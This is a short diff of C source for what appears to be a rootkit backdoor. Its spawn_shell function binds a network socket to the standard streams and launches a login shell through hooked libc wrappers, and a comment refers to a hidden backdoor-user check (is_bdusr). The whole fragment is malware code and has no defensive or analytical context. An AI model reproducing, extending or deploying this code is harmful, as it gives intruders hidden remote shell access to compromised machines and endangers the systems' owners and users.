@@ -1,12 +1,14 @@
 void spawn_shell(int sockfd){
     char *argv[3];
 
-    argv[0] = BASH_PATH;
-    argv[1] = LOGIN_FLAG;
+    argv[0] = SHELL_PATH;
+    argv[1] = "--login";
     argv[2] = NULL;
 
     for(int i = 0; i < 3; i++) dup2(sockfd, i);
-    chdir(INSTALL_DIR);
+
+    hook(CCHDIR);
+    call(CCHDIR, INSTALL_DIR);
     system(PRE_SHELL);
     hook(CEXECVE);
     call(CEXECVE, argv[0], argv, NULL);    /* environment vars already set by is_bdusr() */
